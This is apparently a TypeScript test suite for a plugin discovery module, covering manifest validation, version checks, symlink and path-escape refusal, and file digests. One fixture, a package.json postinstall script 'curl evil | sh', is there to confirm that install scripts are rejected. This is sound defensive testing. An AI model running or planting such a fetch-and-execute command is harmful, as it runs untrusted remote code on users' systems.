import assert from 'node:assert/strict';
import fs, {
  chmod,
  link,
  mkdir,
  mkdtemp,
  realpath,
  rm,
  symlink,
  writeFile,
} from 'node:fs/promises';
import { syncBuiltinESMExports } from 'node:module';
import { tmpdir } from 'node:os';
import { join, relative } from 'node:path';
import { after, before, beforeEach, describe, it } from 'node:test';

import {
  discoverPlugin,
  discoverPlugins,
  type DiscoveredPlugin,
  type PluginRoot,
} from './discovery.js';

const CORE = '1.2.0';

function manifest(id: string, extra: Record<string, unknown> = {}): Record<string, unknown> {
  return {
    id,
    version: '1.0.0',
    name: `Plugin ${id}`,
    engines: { swellwright: '>=1.0 <2' },
    provides: [{ kind: 'DnsProvider', entry: './dist/provider.js' }],
    permissions: { network: ['api.nic.ru:443'], secrets: ['dns-oauth'] },
    license: 'AGPL-3.0-only',
    ...extra,
  };
}

describe('plugin discovery', () => {
  let base: string;
  let official: PluginRoot;
  let local: PluginRoot;

  before(async () => {
    base = await mkdtemp(join(tmpdir(), 'sw-plugins-'));
  });
  after(async () => {
    await rm(base, { recursive: true, force: true });
  });
  beforeEach(async () => {
    await rm(join(base, 'official'), { recursive: true, force: true });
    await rm(join(base, 'local'), { recursive: true, force: true });
    await mkdir(join(base, 'official'), { recursive: true });
    await mkdir(join(base, 'local'), { recursive: true });
    official = { directory: join(base, 'official'), trust: 'official' };
    local = { directory: join(base, 'local'), trust: 'local' };
  });

  /** Makes a plugin directory: the manifest, the module it names, and whatever else is given. */
  async function plugin(
    root: PluginRoot,
    folder: string,
    content: Record<string, unknown> | string = manifest(folder),
    files: Record<string, string> = { 'dist/provider.js': 'export {};' },
  ): Promise<void> {
    const directory = join(root.directory, folder);
    await mkdir(directory, { recursive: true });
    await writeFile(
      join(directory, 'swellwright.plugin.json'),
      typeof content === 'string' ? content : JSON.stringify(content),
    );
    for (const [name, text] of Object.entries(files)) {
      await mkdir(join(directory, name, '..'), { recursive: true });
      await writeFile(join(directory, name), text);
    }
  }

  const only = (found: readonly DiscoveredPlugin[]): DiscoveredPlugin => {
    assert.equal(found.length, 1);
    const [one] = found;
    assert.ok(one);
    return one;
  };

  it('finds a sound plugin, and says where it came from', async () => {
    await plugin(official, 'dns-rucenter');
    await plugin(
      local,
      'notify-webhook',
      manifest('notify-webhook', {
        provides: [{ kind: 'NotificationChannel', driver: 'driver.yaml' }],
      }),
      {
        'driver.yaml': [
          'version: 1',
          'kind: NotificationChannel',
          'operations:',
          '  send:',
          '    steps:',
          '      - id: call',
          '        request:',
          '          url: https://api.nic.ru/send',
          '',
        ].join('\n'),
      },
    );
    const found = await discoverPlugins([official, local], CORE);
    assert.deepEqual(
      found.map((p) => [p.folder, p.trust, p.state, p.problems.length]),
      [
        ['dns-rucenter', 'official', 'available', 0],
        ['notify-webhook', 'local', 'available', 0],
      ],
    );
    assert.equal(found[0]?.manifest?.permissions.network[0], 'api.nic.ru:443');
  });

  it('skips a root that does not exist, hidden folders, node_modules and plain files', async () => {
    await mkdir(join(official.directory, '.git'));
    await mkdir(join(official.directory, 'node_modules'));
    await writeFile(join(official.directory, 'README.md'), '# plugins');
    await plugin(official, 'dns-rucenter');
    const found = await discoverPlugins(
      [{ directory: join(base, 'nowhere'), trust: 'official' }, official],
      CORE,
    );
    assert.deepEqual(
      found.map((p) => p.folder),
      ['dns-rucenter'],
    );
  });

  it('reports a directory without a manifest', async () => {
    await mkdir(join(official.directory, 'dns-rucenter'));
    const found = only(await discoverPlugins([official], CORE));
    assert.equal(found.state, 'invalid');
    assert.match(found.problems.join(), /has no swellwright\.plugin\.json/u);
    assert.equal(found.manifest, undefined);
  });

  it('does not report a directory that holds only documentation: it is a plugin that is planned', async () => {
    await mkdir(join(official.directory, 'dns-cloudflare'));
    await writeFile(join(official.directory, 'dns-cloudflare', 'README.md'), '# planned');
    await mkdir(join(official.directory, 'dns-route53'));
    await writeFile(join(official.directory, 'dns-route53', 'LICENSE'), 'text');
    await writeFile(join(official.directory, 'dns-route53', 'notes.md'), 'text');
    await mkdir(join(official.directory, 'half-done'));
    await writeFile(join(official.directory, 'half-done', 'script.js'), 'export {};');
    const found = await discoverPlugins([official], CORE);
    assert.deepEqual(
      found.map((p) => [p.folder, p.state]),
      [['half-done', 'invalid']],
      'a directory with anything but documentation and no manifest is still reported',
    );
  });

  it('reports a manifest that is not JSON or does not fit the schema', async () => {
    await plugin(official, 'broken', '{ not json');
    await plugin(official, 'strange', manifest('strange', { permisions: {} }));
    await plugin(official, 'badid', manifest('Bad_Id'));
    const found = await discoverPlugins([official], CORE);
    const byFolder = Object.fromEntries(found.map((p) => [p.folder, p]));
    assert.match(byFolder['broken']?.problems.join() ?? '', /not valid JSON/u);
    assert.match(byFolder['strange']?.problems.join() ?? '', /permisions/u);
    assert.match(byFolder['badid']?.problems.join() ?? '', /^id: /u);
    assert.ok(found.every((p) => p.state === 'invalid'));
  });

  it('refuses a manifest that is too large', async () => {
    await plugin(official, 'huge', 'x'.repeat(70 * 1024));
    const found = only(await discoverPlugins([official], CORE));
    assert.equal(found.state, 'invalid');
    assert.match(found.problems.join(), /larger than 64 KiB/u);
  });

  it('wants the directory to be named after the plugin', async () => {
    await plugin(official, 'some-folder', manifest('dns-rucenter'));
    const found = only(await discoverPlugins([official], CORE));
    assert.equal(found.state, 'invalid');
    assert.match(found.problems.join(), /named "some-folder" but the plugin id is "dns-rucenter"/u);
  });

  it('distinguishes a plugin for other versions from a broken one', async () => {
    await plugin(official, 'too-new', manifest('too-new', { engines: { swellwright: '>=2.0' } }));
    await plugin(official, 'too-old', manifest('too-old', { engines: { swellwright: '<1.0.0' } }));
    await plugin(
      official,
      'nonsense',
      manifest('nonsense', { engines: { swellwright: '>>=what' } }),
    );
    const found = Object.fromEntries(
      (await discoverPlugins([official], CORE)).map((p) => [p.folder, p]),
    );
    const at = (folder: string): DiscoveredPlugin => {
      const one = found[folder];
      assert.ok(one, folder);
      return one;
    };
    assert.equal(at('too-new').state, 'incompatible');
    assert.match(at('too-new').problems.join(), /needs Swellwright >=2\.0, this is 1\.2\.0/u);
    assert.equal(at('too-old').state, 'incompatible');
    assert.equal(at('nonsense').state, 'invalid');
    assert.ok(at('too-new').manifest, 'a plugin for other versions is still described');
  });

  it('counts a pre-release of the core as the version it is heading for', async () => {
    await plugin(official, 'dns-rucenter');
    const found = only(await discoverPlugins([official], '1.3.0-rc.1'));
    assert.equal(found.state, 'available');
  });

  it('reports a file the manifest names that is not there', async () => {
    await plugin(
      official,
      'dns-rucenter',
      manifest('dns-rucenter', { ui: { settings: 'ui/settings.json' } }),
    );
    const found = only(await discoverPlugins([official], CORE));
    assert.equal(found.state, 'invalid');
    assert.deepEqual(found.problems, ['"ui/settings.json" does not exist']);
  });

  it('treats a non-directory path component as a missing manifest file, without aborting discovery', async () => {
    await plugin(
      local,
      'broken-path',
      manifest('broken-path', { ui: { settings: 'ui/settings.json' } }),
      {
        'dist/provider.js': 'export {};',
        ui: 'not a directory',
      },
    );
    await plugin(local, 'other-plugin');
    const found = await discoverPlugins([local], CORE);
    assert.match(found[0]?.problems.join() ?? '', /ui\/settings\.json.*does not exist/u);
    assert.equal(found[1]?.state, 'available');
  });

  it('isolates unreadable files to their plugin and retries once', async (t) => {
    await plugin(local, 'blocked-plugin');
    await plugin(local, 'other-plugin');
    const openFile = fs.open.bind(fs);
    const unreadable = await realpath(
      join(local.directory, 'blocked-plugin', 'swellwright.plugin.json'),
    );
    let attempts = 0;
    const open = t.mock.method(fs, 'open', (...args: Parameters<typeof fs.open>) => {
      if (typeof args[0] === 'string' && relative(unreadable, args[0]) === '') {
        attempts += 1;
        return Promise.reject(Object.assign(new Error('read denied'), { code: 'EACCES' }));
      }
      return openFile(...args);
    });
    syncBuiltinESMExports();
    try {
      const found = await discoverPlugins([local], CORE);
      assert.equal(found[0]?.transient, true);
      assert.equal(found[1]?.state, 'available');
      assert.equal(attempts, 2);
    } finally {
      open.mock.restore();
      syncBuiltinESMExports();
    }
  });

  it('does not stat any sibling directories when verifying a single plugin', async (t) => {
    await plugin(local, 'only-this');
    await plugin(local, 'unrelated');
    const stat = t.mock.method(fs, 'lstat');
    syncBuiltinESMExports();
    try {
      assert.equal((await discoverPlugin([local], CORE, 'only-this'))?.state, 'available');
      assert.ok(stat.mock.callCount() > 0);
      assert.ok(stat.mock.calls.every((call) => !String(call.arguments[0]).includes('unrelated')));
    } finally {
      stat.mock.restore();
      syncBuiltinESMExports();
    }
  });

  it('does not let an unverifiable candidate shadow a valid plugin in another root', async () => {
    await plugin(official, 'same-plugin');
    await plugin(local, 'same-plugin');
    await link(
      join(official.directory, 'same-plugin', 'dist', 'provider.js'),
      join(base, 'hardlink-alias.js'),
    );
    assert.equal((await discoverPlugin([official, local], CORE, 'same-plugin'))?.trust, 'local');
    const found = await discoverPlugins([official, local], CORE);
    assert.equal(found.find((candidate) => candidate.state === 'available')?.trust, 'local');
    assert.equal((await discoverPlugin([local, official], CORE, 'same-plugin'))?.trust, 'local');
  });

  it(
    'isolates a mode-000 manifest on POSIX',
    { skip: process.platform === 'win32' || process.getuid?.() === 0 },
    async () => {
      await plugin(local, 'locked-plugin');
      await plugin(local, 'other-plugin');
      const file = join(local.directory, 'locked-plugin', 'swellwright.plugin.json');
      await chmod(file, 0);
      try {
        const found = await discoverPlugins([local], CORE);
        assert.equal(found[0]?.transient, true);
        assert.equal(found[1]?.state, 'available');
      } finally {
        await chmod(file, 0o600);
      }
    },
  );

  it('reports an ELOOP in a manifest reference without aborting sibling discovery', async (t) => {
    await plugin(
      local,
      'loop-plugin',
      manifest('loop-plugin', { ui: { settings: 'ui/settings.json' } }),
    );
    await plugin(local, 'other-plugin');
    const target = join(local.directory, 'loop-plugin', 'ui', 'settings.json');
    const original = fs.lstat.bind(fs);
    const stat = t.mock.method(fs, 'lstat', (...args: Parameters<typeof fs.lstat>) =>
      args[0] === target
        ? Promise.reject(Object.assign(new Error('symlink loop'), { code: 'ELOOP' }))
        : original(...args),
    );
    syncBuiltinESMExports();
    try {
      const found = await discoverPlugins([local], CORE);
      assert.match(found[0]?.problems.join() ?? '', /reached through a link/u);
      assert.equal(found[1]?.state, 'available');
    } finally {
      stat.mock.restore();
      syncBuiltinESMExports();
    }
  });

  it('refuses a path that leaves the plugin, however it is written', async () => {
    await plugin(official, 'escape', manifest('escape', { config: { schema: '../outside.json' } }));
    const found = only(await discoverPlugins([official], CORE));
    assert.equal(found.state, 'invalid');
    assert.match(found.problems.join(), /config\.schema/u);
  });

  it('does not follow a link out of the plugin', async (t) => {
    await writeFile(join(base, 'outside.js'), 'export {};');
    await plugin(official, 'linked', manifest('linked'), {});
    await mkdir(join(official.directory, 'linked', 'dist'));
    try {
      await symlink(
        join(base, 'outside.js'),
        join(official.directory, 'linked', 'dist', 'provider.js'),
      );
    } catch {
      t.skip('this system does not let the test make links');
      return;
    }
    const found = only(await discoverPlugins([official], CORE));
    assert.equal(found.state, 'invalid');
    assert.match(found.problems.join(), /links are not followed/u);
  });

  it('does not follow a plugin directory that is a link', async (t) => {
    await plugin(local, 'real-one');
    try {
      await symlink(
        join(local.directory, 'real-one'),
        join(official.directory, 'linked-one'),
        'dir',
      );
    } catch {
      t.skip('this system does not let the test make links');
      return;
    }
    const found = only(await discoverPlugins([official], CORE));
    assert.equal(found.state, 'invalid');
    assert.match(found.problems.join(), /is a link/u);
  });

  it('refuses a module inside .git, which is not part of what is approved', async () => {
    await plugin(
      local,
      'from-history',
      manifest('from-history', {
        provides: [{ kind: 'DnsProvider', entry: './.git/hooks/provider.js' }],
      }),
      { '.git/hooks/provider.js': 'export {};' },
    );
    const found = only(await discoverPlugins([local], CORE));
    assert.equal(found.state, 'invalid');
    assert.match(found.problems.join(), /inside \.git/u);
  });

  it('says why a settings schema is refused instead of leaving the plugin usable without it', async () => {
    await plugin(
      local,
      'big-schema',
      manifest('big-schema', { config: { schema: './settings.json' } }),
      { 'dist/provider.js': 'export {};', 'settings.json': ' '.repeat(65 * 1024) },
    );
    const found = only(await discoverPlugins([local], CORE));
    assert.equal(found.state, 'invalid');
    assert.match(found.problems.join(), /settings\.json is larger than 64 KiB/u);
  });

  it('forbids install scripts', async () => {
    await plugin(official, 'dns-rucenter', manifest('dns-rucenter'), {
      'dist/provider.js': 'export {};',
      'package.json': JSON.stringify({
        name: 'x',
        scripts: { postinstall: 'curl evil | sh', test: 'node t.js' },
      }),
    });
    const found = only(await discoverPlugins([official], CORE));
    assert.equal(found.state, 'invalid');
    assert.deepEqual(found.problems, [
      'package.json has a "postinstall" script; plugins may not run install scripts',
    ]);
  });

  it('accepts a package.json without install scripts', async () => {
    await plugin(official, 'dns-rucenter', manifest('dns-rucenter'), {
      'dist/provider.js': 'export {};',
      'package.json': JSON.stringify({ name: 'x', scripts: { build: 'tsc' } }),
    });
    assert.equal(only(await discoverPlugins([official], CORE)).state, 'available');
  });

  it('lets the earlier root win when two plugins have the same id', async () => {
    await plugin(official, 'dns-rucenter');
    await plugin(local, 'dns-rucenter');
    const found = await discoverPlugins([official, local], CORE);
    assert.deepEqual(
      found.map((p) => [p.trust, p.state]),
      [
        ['official', 'available'],
        ['local', 'invalid'],
      ],
    );
    assert.match(found[1]?.problems.join() ?? '', /already used by/u);
  });

  it('gives a usable plugin the digest of its files and an unusable one none', async () => {
    await plugin(official, 'dns-rucenter');
    await plugin(
      official,
      'dns-other',
      manifest('dns-other', { engines: { swellwright: '>=9.0' } }),
    );
    await mkdir(join(official.directory, 'no-manifest'));
    const found = await discoverPlugins([official], CORE);
    const byFolder = Object.fromEntries(found.map((p) => [p.folder, p]));
    assert.match(byFolder['dns-rucenter']?.digest ?? '', /^[0-9a-f]{64}$/u);
    assert.match(
      byFolder['dns-other']?.digest ?? '',
      /^[0-9a-f]{64}$/u,
      'an incompatible plugin has one to show',
    );
    assert.equal(byFolder['no-manifest']?.digest, undefined);
    assert.equal(byFolder['dns-rucenter']?.digest === byFolder['dns-other']?.digest, false);
  });

  it('changes the digest when a file changes, is added or is removed', async () => {
    await plugin(official, 'dns-rucenter');
    const digest = async (): Promise<string | undefined> =>
      only(await discoverPlugins([official], CORE)).digest;
    const first = await digest();
    await writeFile(
      join(official.directory, 'dns-rucenter', 'dist', 'provider.js'),
      'export const x = 1;',
    );
    const changed = await digest();
    await writeFile(join(official.directory, 'dns-rucenter', 'notes.txt'), 'new');
    const added = await digest();
    await rm(join(official.directory, 'dns-rucenter', 'notes.txt'));
    const removed = await digest();
    assert.equal(new Set([first, changed, added]).size, 3);
    assert.equal(removed, changed, 'back to the same files, the same digest');
  });

  it('refuses a link inside a plugin, even one that stays inside it', async () => {
    await plugin(official, 'dns-rucenter');
    try {
      await symlink(
        join(official.directory, 'dns-rucenter', 'dist'),
        join(official.directory, 'dns-rucenter', 'alias'),
        'dir',
      );
    } catch {
      return; // creating links needs a privilege on some systems
    }
    const found = only(await discoverPlugins([official], CORE));
    assert.equal(found.state, 'invalid');
    assert.match(found.problems.join(), /may not contain links/u);
  });
});
